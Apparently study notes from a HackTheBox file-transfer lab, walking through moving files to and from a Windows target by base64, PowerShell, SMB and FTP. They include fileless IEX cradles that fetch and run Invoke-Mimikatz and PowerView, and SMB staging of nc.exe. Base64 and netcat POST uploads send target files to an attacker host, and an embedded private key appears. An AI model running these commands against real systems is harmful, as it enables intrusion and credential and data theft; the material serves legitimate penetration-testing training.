We have access to the machine MS02, and we need to download a file from our Pwnbox machine. Let's see how we can accomplish this using multiple File Download methods.

### PowerShell Base64 Encode & Decode

Encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content

**Pwnbox Check SSH Key MD5 Hash**
```
md5sum id_rsa
```

Encode SSH Key to Base64
```
cat id_rsa |base64 -w 0;echo
```

Copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
```
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

Now confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does

**Confirming the MD5 Hashes Match**
```
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
	-While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

**PowerShell Web Downloads**
The following table describes WebClient methods for downloading data from a resource

**OpenRead**	........................Returns the data from a resource as a Stream.

**OpenReadAsync**	............Returns the data from a resource without blocking the calling thread.

**DownloadData**	................Downloads data from a resource and returns a Byte array.

**DownloadDataAsync**........Downloads data from a resource and returns a Byte array without blocking the calling thread.

**DownloadFile**	....................Downloads data from a resource to a local file.

**DownloadFileAsync**	........Downloads data from a resource to a local file without blocking the calling thread.

**DownloadString**................Downloads a String from a resource and returns a String.

**DownloadStringAsync**	....Downloads a String from a resource without blocking the calling thread.


**The below downloads the file and stores its contents in 'PowerView.ps1'**. This is demonstrating the DownloadFile and the DownloadFileAsync methods
```
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

```
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```


**PowerShell DownloadString - Fileless Method**

- Fileless attacks work by using some operating system functions to download the payload and execute it directly
- PowerShell can also be used to perform fileless attacks
- Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

Using pipeline input....
```
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

**PowerShell Invoke-WebRequest**

- Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
- Use the aliases iwr, curl, and wget instead of the Invoke-WebRequest since it is much slower since PowerShell 3.0
```
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

**Common Errors with PowerShell**

- Internet Explorer first-launch configuration has not been completed, which prevents the download.
- This can be bypassed using the -UseBasicParsing parameter
```
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

### SMB Downloads

To download files from HackTheBox's PwnBox, we will have to create an SMB server on the PwnBox machine

**Create SMB Server Without a Password**
```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

**Copy the target file on your Windows machine**
```
C:\htb> copy \\192.168.220.133\share\nc.exe
```

- If your org has security policies in place, you can't download this file without credentials. So we will re-create the SMB server with credentials
- To access, you will have to mount the SMB server on our windows machine

**Creating SMB Server with Credentials**
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

On your Windows machine mount the SMB server
```
net use n: \\192.168.220.133\share /user:test test
```

### FTP Downloads

**Creating FTP Server**
```
sudo python3 -m pyftpdlib --port 21
```

**Transfering Files from an FTP Server Using PowerShell**
```
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```

If you get on the box and don't have an interactive shell. Create an FTP command file to download a file. Use the FTP client to then download that file

```
echo open 192.168.49.128 > ftpcommand.txt

echo USER anonymous >> ftpcommand.txt

echo binary >> ftpcommand.txt

echo GET file.txt >> ftpcommand.txt

echo bye >> ftpcommand.txt
```

Now log in to the FTP server with the file
```
ftp -v -n -s:ftpcommand.txt
```

### Upload Operations

The same methods used for downloading files can be used for uploading them
First we encode the file using powershell, then confirm the hash is the same with md5sum on linux

**Encode using PowerShell**
```
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

```
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

Using the base64 encoded output of the first command, we will now decode it with base64 -d

**Decode Base64 String in Linux**
```
echo "output of first command" | base64 -d > hosts
```

**Verify the md5sum hash**
```
md5sum hosts
```


**PowerShell Web Uploads**

Since PowerShell does not have built-in upload operations will have take the following steps:
- Use the Invoke-WebRequest or Invoke-RestMethod methods
- Configure a webserver to accept uploads
- For the webserver we will use an extended module of the Python HTTP.server module called **uploadserver**

**Install uploadserver**
```
pip3 install uploadserver
```

```
python3 -m uploadserver
```

- Use the PSUploads.ps1 script to perform upload operations
- It accepts two parameters: -File, which specifies the file path. And -Uri, the server path to upload said file

**PowerShell Script to Upload a File to Python Upload Server**

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

```
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

**PowerShell Base64 Web Upload**

- Invoke-WebRequest or Invoke-RestMethod together with Netcat
- Use Netcat to listen in on a port we specify and send the file as a POST request
- copy the output and use the base64 decode function to convert the base64 string into a file
```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```
```
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Listen on port 8000
```
nc -lnvp 8000
```

Now decrypt the file
```
echo <base64> | base64 -d -w 0 > hosts
```





